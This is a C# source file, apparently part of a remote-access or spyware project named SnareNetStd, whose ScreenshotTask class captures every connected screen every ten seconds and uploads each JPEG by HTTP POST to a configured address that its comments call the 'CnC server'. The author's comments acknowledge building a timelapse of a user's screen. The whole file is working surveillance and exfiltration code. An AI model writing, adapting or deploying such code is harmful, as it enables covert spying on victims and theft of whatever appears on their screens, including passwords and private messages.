using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Configuration;
using System.Net.Http;
using System.Net.Mime;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SnareNetStd
{
    class ScreenshotTask
    {
        public ScreenshotTask() { KeepGoing = false; }

        private volatile bool _KeepGoing;

        public bool KeepGoing
        {
            get { return _KeepGoing; }
            set { _KeepGoing = value; }
        }

        /// <summary>
        /// Takes a screenshot every 10 seconds.
        /// </summary>
        public void TakeScreenshots()
        {
            while (_KeepGoing)
            {
                Console.WriteLine("Taking Screenshot");
                screenShotAllScreensAsOne();
                Thread.Sleep(10000);
            }
        }

        /// <summary>
        /// Takes a screenshot and saves it to a hardcoded location on the local machine
        /// (Still under deveopment)
        /// From https://www.codeproject.com/Tips/817001/Saving-a-screenshot-using-Csharp-A-K-A-Console-Mon
        /// Hackily altered by meee, probably redundancies that need cleaning up
        /// </summary>
        private void screenShotAllScreens(string saveDir = "")
        {
            foreach (var screen in Screen.AllScreens)
            {
                string fileName = $"{screen.DeviceName.Replace('/', '_') }{ DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)")}";
                Console.WriteLine($"ID {screen.DeviceName}");
                Console.WriteLine($"Height {screen.Bounds.Height} Width {screen.Bounds.Width}");
                Console.WriteLine($"Top {screen.Bounds.Top} Bottom {screen.Bounds.Bottom}");
                Console.WriteLine($"Left {screen.Bounds.Left} Right {screen.Bounds.Right}");
                Console.WriteLine($"X {screen.Bounds.X} Y {screen.Bounds.Y}");

                Console.WriteLine("Taking screenshot...");
                int TLX = screen.Bounds.X; //TL = top left
                int TLY = screen.Bounds.Y; //TL = top left
                Bitmap memoryImage;
                memoryImage = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
                Size s = new Size(memoryImage.Width, memoryImage.Height);

                Graphics memoryGraphics = Graphics.FromImage(memoryImage);

                memoryGraphics.CopyFromScreen(TLX, TLY, 0, 0, s);

                if (!string.IsNullOrWhiteSpace(saveDir))
                {
                    fileName = $@"{saveDir}\{fileName}";
                }
                else
                {
                    fileName = $@"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\ss\{fileName}";
                }

                //That's it! Save the image in the directory and this will work like charm.
                ImageConverter converter = new ImageConverter();
                var ImageBytes = (byte[])converter.ConvertTo(memoryImage, typeof(byte[]));

                using (var ms = new MemoryStream(ImageBytes))
                {
                    var img = Image.FromStream(ms);
                    ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                    Encoder myEncoder = Encoder.Quality;

                    EncoderParameters myEncoderParameters = new EncoderParameters(1);
                    EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 75L); // 75% quality
                    myEncoderParameters.Param[0] = myEncoderParameter;

                    img.Save($@"{fileName}.jpg", jpgEncoder, myEncoderParameters);

                }

                // Write the message,
                Console.WriteLine("Picture has been saved...");

            }
        }

        /// <summary>
        /// Take a screenshot of all connected screens and save a single image.
        /// Oh God, I think I've built a timelapse of a user's screen.
        /// </summary>
        /// <param name="saveDir"></param>
        private void screenShotAllScreensAsOne(string saveDir = "")
        {
            string fileName = $"{DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)")}";
            if (!string.IsNullOrWhiteSpace(saveDir))
            {
                fileName = $@"{saveDir}\{fileName}";
            }
            else
            {
                fileName = $@"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\ss\{fileName}";
            }

            // Determine the size of the "virtual screen", which includes all monitors.
            int screenLeft = SystemInformation.VirtualScreen.Left;
            int screenTop = SystemInformation.VirtualScreen.Top;
            int screenWidth = SystemInformation.VirtualScreen.Width;
            int screenHeight = SystemInformation.VirtualScreen.Height;

            // Create a bitmap of the appropriate size to receive the screenshot.
            using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
            {
                // Draw the screenshot into our bitmap.
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
                }

                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                Encoder myEncoder = Encoder.Quality;
                EncoderParameters myEncoderParameters = new EncoderParameters(1);
                EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 75L); // 75% quality
                myEncoderParameters.Param[0] = myEncoderParameter;

                // Saving file to a stream.

                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, jpgEncoder, myEncoderParameters);
                    Console.WriteLine(ms.Length);
                    UploadImage(ms, $"{DateTime.Now.ToString("dd_MMMM_hh_mm_ss_tt")}.jpg");
                }

                // Now we don't need to save images locally!
                // bmp.Save($@"{fileName}.jpg", jpgEncoder, myEncoderParameters);

            }

        }

        /// <summary>
        /// From https://docs.microsoft.com/en-us/dotnet/framework/winforms/advanced/how-to-set-jpeg-compression-level
        /// </summary>
        /// <param name="format"></param>
        /// <returns></returns>
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        /// <summary>
        /// Takes a MemoryStream containing an image and uploads it to the CnC server.
        /// </summary>
        /// <param name="ms">The memorystream.</param>
        /// <param name="fileName">The name of the file.</param>
        private void UploadImage(MemoryStream ms, string fileName)
        {
            // From http://dev.bratched.fr/en/uploading-multiple-files-with-c/

            // Set the boundary string. AFAIK this is used by the server to find the sections in the uploaded data, and split files from multipart text.
            // This one is just a bunch of dashes and datetime string in a certain format.
            string boundary = "---------------------------" +
                              DateTime.Now.Ticks.ToString("x", System.Globalization.NumberFormatInfo.InvariantInfo);

            // TODO - I'll need to alter this to not be statically set.
            var screenShotUploadRequest = WebRequest.Create($@"http://{Config.Instance.Screenshot.IPAddress}:{Config.Instance.Screenshot.PortNumber}");
            // Setting up some other parameters.
            screenShotUploadRequest.Method = "POST";
            screenShotUploadRequest.ContentType = "multipart/form-data; boundary=" + boundary;
            boundary = "--" + boundary;

            // Oh goodness me. This bit was paaaaaainful. First we get our request stream.
            using (var ssUlRequestStream = screenShotUploadRequest.GetRequestStream())
            {
                // First we pass the boundary marker in to the upload stream.
                // Also note that upload streams seem to send as data is passed in, rather than at the end.
                // This means that you can't check the size of the stream, to check that the MemorySet copied to the upload stream as intended. >:(
                var buffer = System.Text.Encoding.ASCII.GetBytes(boundary + "\n");
                ssUlRequestStream.Write(buffer, 0, buffer.Length);
                // Write out the content disposition header. Here we have to have the fixed "name" attribute, the upload server I'm using is pretty ghetto, and regexes
                // for a name called "file". 
                buffer = System.Text.Encoding.UTF8.GetBytes(string.Format("Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"{2}", "file", fileName, Environment.NewLine));
                ssUlRequestStream.Write(buffer, 0, buffer.Length);
                // Finally content type.
                buffer = System.Text.Encoding.ASCII.GetBytes(string.Format("Content-Type: {0}{1}{1}", "image/jpeg", Environment.NewLine));
                ssUlRequestStream.Write(buffer, 0, buffer.Length);
                // I tried ms.CopyTo(ssUlUploadStream) but no bueno. This worked however.
                buffer = ms.ToArray();
                ssUlRequestStream.Write(buffer, 0, buffer.Length);
                // I love newlines. So. Effing. Much?
                buffer = System.Text.Encoding.ASCII.GetBytes(Environment.NewLine);
                ssUlRequestStream.Write(buffer, 0, buffer.Length);
                // Send our final boundary.
                var boundaryBuffer = System.Text.Encoding.ASCII.GetBytes(boundary + "--");
                ssUlRequestStream.Write(boundaryBuffer, 0, boundaryBuffer.Length);
                // And then I need to send a bunch of these. If I don't it doesn't seem to properly send things. This solves the problem however.
                buffer = System.Text.Encoding.ASCII.GetBytes(Environment.NewLine);
                ssUlRequestStream.Write(buffer, 0, buffer.Length);
                buffer = System.Text.Encoding.ASCII.GetBytes(Environment.NewLine);
                ssUlRequestStream.Write(buffer, 0, buffer.Length);
                buffer = System.Text.Encoding.ASCII.GetBytes(Environment.NewLine);
                ssUlRequestStream.Write(buffer, 0, buffer.Length);

                using (var response = screenShotUploadRequest.GetResponse())
                {
                    // Meh... for now I don't care if they upload or not... I can always check on the server.
                }
            }



        }
    }
}
